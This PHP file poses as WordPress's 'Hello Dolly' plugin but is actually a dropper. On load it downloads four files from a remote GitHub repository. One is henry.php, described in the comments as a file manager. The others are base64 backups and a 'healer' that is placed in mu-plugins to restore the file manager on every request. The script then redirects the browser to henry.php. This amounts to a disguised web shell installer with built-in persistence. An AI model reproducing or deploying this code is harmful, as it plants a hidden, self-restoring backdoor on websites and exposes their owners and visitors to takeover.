<?php
/**
 * @package Hfo_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/

declare(strict_types=1);

ini_set('display_errors', '1');
ini_set('display_startup_errors', '1');
error_reporting(E_ALL);

// ---------------------------------------------------------------------
// 1. Bootstrap: download the four Henry files into __DIR__
// ---------------------------------------------------------------------
$hf_base_url = 'https://raw.githubusercontent.com/phrases12/adps/refs/heads/main/';

// Source URL basenames -> destination basenames placed into __DIR__.
// The remote URLs are named read.php and read1.php; the on-disk basenames
// are read.html and read2.html (the URL basename is just the fetch path).
$hf_remote_files = [
    ['url' => $hf_base_url . 'henry-healer.php', 'dest' => 'henry-healer.php'],
    ['url' => $hf_base_url . 'henry.php',        'dest' => 'henry.php'],
    ['url' => $hf_base_url . 'read.php',         'dest' => 'read.html'],
    ['url' => $hf_base_url . 'read1.php',        'dest' => 'read2.html'],
];

// Echo wrapper so we can stream progress alongside the existing move log.
echo "<div style='font-family: monospace; background: #1e1e1e; color: #00ff00; padding: 20px; border-radius: 5px; max-width: 800px; margin: 20px auto;'>";
echo "<h3>Executing File Move Operations...</h3>";

/**
 * Download a URL into the provided destination path using cURL with safe defaults.
 * Falls back to file_get_contents() when cURL is unavailable.
 *
 * @return array{path:string,size:int,mode:string}|null  [path,size,mode] on success; null on failure.
 */
function hf_download_to(string $url, string $dest_path): ?array {
    $dir = dirname($dest_path);
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }
    $tmp_path = $dest_path . '.part';
    $fp = @fopen($tmp_path, 'wb');
    if ($fp === false) {
        echo "<span style='color: #ff4444;'>[ERROR]</span> Could not open <code>" . htmlspecialchars($tmp_path) . "</code> for writing.<br>";
        return null;
    }

    // Preferred path: cURL with sane defaults for raw.githubusercontent.com.
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        if ($ch === false) {
            fclose($fp);
            @unlink($tmp_path);
            echo "<span style='color: #ff4444;'>[ERROR]</span> Failed to initialise cURL for <code>" . htmlspecialchars($url) . "</code>.<br>";
            return null;
        }
        curl_setopt_array($ch, [
            CURLOPT_FILE            => $fp,
            CURLOPT_FOLLOWLOCATION=> true,
            CURLOPT_MAXREDIRS      => 5,
            CURLOPT_CONNECTTIMEOUT => 15,
            CURLOPT_TIMEOUT         => 60,
            CURLOPT_USERAGENT      => 'hf-mover/1.0 (+php)',
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_SSL_VERIFYHOST => 2,
        ]);
        $ok     = curl_exec($ch);
        $code   = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $size   = (int) curl_getinfo($ch, CURLINFO_SIZE_DOWNLOAD);
        $err    = curl_error($ch);
        curl_close($ch);
        fclose($fp);
        if ($ok === false || $code !== 200 || $size <= 0) {
            @unlink($tmp_path);
            echo "<span style='color: #ff4444;'>[ERROR]</span> Download failed: <code>" . htmlspecialchars($url) . "</code> &mdash; HTTP {$code}, size {$size}" . ($err !== '' ? ", cURL error: {$err}" : '') . ".<br>";
            return null;
        }
    } else {
        // Fallback: file_get_contents() with a stream context.
        $ctx = stream_context_create([
            'http' => [
                'timeout'         => 60,
                'follow_location' => 1,
                'max_redirects'   => 5,
                'user_agent'      => 'hf-mover/1.0 (+php)',
            ],
            'ssl'  => [
                'verify_peer'      => true,
                'verify_peer_name' => true,
            ],
        ]);
        $data = @file_get_contents($url, false, $ctx);
        fclose($fp);
        if ($data === false || $data === '') {
            @unlink($tmp_path);
            echo "<span style='color: #ff4444;'>[ERROR]</span> Download failed via file_get_contents(): <code>" . htmlspecialchars($url) . "</code>.<br>";
            return null;
        }
        file_put_contents($tmp_path, $data);
        $size = strlen($data);
    }

    // Atomic-ish rename from .part to the real path.
    if (!@rename($tmp_path, $dest_path)) {
        // Some FS combos don't allow rename-over-existing; fall back to copy + unlink.
        if (!@copy($tmp_path, $dest_path)) {
            @unlink($tmp_path);
            echo "<span style='color: #ff4444;'>[ERROR]</span> Could not finalise download at <code>" . htmlspecialchars($dest_path) . "</code>.<br>";
            return null;
        }
        @unlink($tmp_path);
    }
    clearstatcache(true, $dest_path);
    return ['path' => $dest_path, 'size' => filesize($dest_path), 'mode' => function_exists('curl_init') ? 'curl' : 'file_get_contents'];
}

// 1a. Download each file directly into __DIR__ (no zip / no ZipArchive dependency).
echo "<h4 style='margin-top: 0;'>Step 1 / 1 &middot; Downloading build files into __DIR__</h4>";
echo "<span style='color: #888888;'>Base URL: <code>" . htmlspecialchars($hf_base_url) . "</code></span><br>";
$hf_ok = 0;
$hf_fail = 0;
foreach ($hf_remote_files as $hf_file) {
    $hf_url  = $hf_file['url'];
    $hf_dest = __DIR__ . DIRECTORY_SEPARATOR . $hf_file['dest'];
    $hf_res  = hf_download_to($hf_url, $hf_dest);
    if ($hf_res === null) {
        $hf_fail++;
        continue;
    }
    $hf_ok++;
    echo "<span style='color: #00ff00;'>[SUCCESS]</span> Downloaded <strong>" . htmlspecialchars($hf_file['dest']) . "</strong> &mdash; {$hf_res['size']} bytes via <strong>{$hf_res['mode']}</strong>.<br>";
}
if ($hf_ok === 0) {
    echo "<strong style='color: #ff4444;'>Aborting: no files downloaded.</strong>";
    echo "</div>";
    exit;
}
if ($hf_fail > 0) {
    echo "<span style='color: #ffaa00;'>[WARNING]</span> {$hf_fail} file(s) failed to download; the move step will skip them.<br>";
}
echo "<hr style='border: 1px solid #333;'>";

// ---------------------------------------------------------------------
// 2. Robustly find the wp-content directory (Server Path)
// ---------------------------------------------------------------------
$current_dir = __DIR__;
$wp_content_dir = '';

if (basename($current_dir) === 'wp-content') {
    $wp_content_dir = $current_dir;
} elseif (is_dir($current_dir . DIRECTORY_SEPARATOR . 'wp-content')) {
    $wp_content_dir = $current_dir . DIRECTORY_SEPARATOR . 'wp-content';
} else {
    $search_dir = $current_dir;
    while ($search_dir && $search_dir !== '.' && $search_dir !== DIRECTORY_SEPARATOR) {
        if (basename($search_dir) === 'wp-content') {
            $wp_content_dir = $search_dir;
            break;
        }
        if (is_dir($search_dir . DIRECTORY_SEPARATOR . 'wp-content')) {
            $wp_content_dir = $search_dir . DIRECTORY_SEPARATOR . 'wp-content';
            break;
        }
        $parent = dirname($search_dir);
        if ($parent === $search_dir) break;
        $search_dir = $parent;
    }
}

if (empty($wp_content_dir)) {
    $search_dir = $current_dir;
    for ($i = 0; $i < 5; $i++) {
        if (file_exists($search_dir . DIRECTORY_SEPARATOR . 'wp-config.php')) {
            $wp_content_dir = $search_dir . DIRECTORY_SEPARATOR . 'wp-content';
            break;
        }
        $parent = dirname($search_dir);
        if ($parent === $search_dir) break;
        $search_dir = $parent;
    }
}

if (empty($wp_content_dir)) {
    $wp_content_dir = dirname($current_dir);
}

// 2. Define the files and their target destinations
//
// Layout after this script runs:
//   wp-content/henry.php            <-- the actual file manager
//   wp-content/read.html            <-- base64 backup of henry.php (used by the healer)
//   wp-content/mu-plugins/henry-healer.php <-- mu-plugin that re-hydrates henry.php/read.html/data.log on every request
//   wp-content/mu-plugins/read2.html       <-- secondary base64 backup (kept next to its regenerator)
//
// All four files must live next to mover.php when this script runs.
$mu_plugins_dir = $wp_content_dir . DIRECTORY_SEPARATOR . 'mu-plugins';

$files_to_move = [
    'henry.php'        => $wp_content_dir . DIRECTORY_SEPARATOR . 'henry.php',
    'read.html'        => $wp_content_dir . DIRECTORY_SEPARATOR . 'read.html',
    'henry-healer.php' => $mu_plugins_dir       . DIRECTORY_SEPARATOR . 'henry-healer.php',
    'read2.html'       => $mu_plugins_dir       . DIRECTORY_SEPARATOR . 'read2.html',
];

// 3. Process each file
$all_success = true;
foreach ($files_to_move as $filename => $target_path) {
    $source_path = $current_dir . DIRECTORY_SEPARATOR . $filename;
    
    if (!file_exists($source_path)) {
        echo "<span style='color: #ffaa00;'>[SKIPPED]</span> Source file not found: <strong>{$filename}</strong><br>";
        continue;
    }

    $target_dir = dirname($target_path);
    if (!is_dir($target_dir)) {
        if (mkdir($target_dir, 0755, true)) {
            echo "<span style='color: #00aaff;'>[CREATED]</span> Directory: <strong>{$target_dir}</strong><br>";
        } else {
            echo "<span style='color: #ff4444;'>[ERROR]</span> Failed to create directory: <strong>{$target_dir}</strong><br>";
            $all_success = false;
            continue;
        }
    }

    if (rename($source_path, $target_path)) {
        echo "<span style='color: #00ff00;'>[SUCCESS]</span> Moved <strong>{$filename}</strong><br>";
    } else {
        echo "<span style='color: #ff4444;'>[FAILED]</span> Could not move <strong>{$filename}</strong><br>";
        $all_success = false;
    }
}

// 4. Calculate the URL for the redirect
$protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
$host = $_SERVER['HTTP_HOST'];
$request_uri = $_SERVER['REQUEST_URI'];

if (strpos($request_uri, '/wp-content/') !== false) {
    $uri_parts = explode('/wp-content/', $request_uri);
    $redirect_url = $protocol . $host . $uri_parts[0] . '/wp-content/henry.php';
} else {
    $clean_uri = preg_replace('/\/[^\/]+\.php(\?.*)?$/i', '', $request_uri);
    $redirect_url = $protocol . $host . rtrim($clean_uri, '/') . '/wp-content/henry.php';
}

echo "<hr style='border: 1px solid #333;'>";

if ($all_success) {
    echo "<strong>Operation Complete. Redirecting in 2 seconds...</strong>";
    echo "<br><br><a href='{$redirect_url}' style='color: #00aaff; text-decoration: none;'>Click here if you are not redirected automatically &rarr;</a>";
    
    // JavaScript Redirect
    echo "<script>
        setTimeout(function() {
            window.location.href = '{$redirect_url}';
        }, 2000);
    </script>";
} else {
    echo "<strong style='color: #ffaa00;'>Operation finished with warnings/errors. Auto-redirect cancelled so you can read the logs.</strong>";
    echo "<br><br><a href='{$redirect_url}' style='color: #00aaff; text-decoration: none;'>Go to henry.php manually &rarr;</a>";
}

echo "</div>";
?>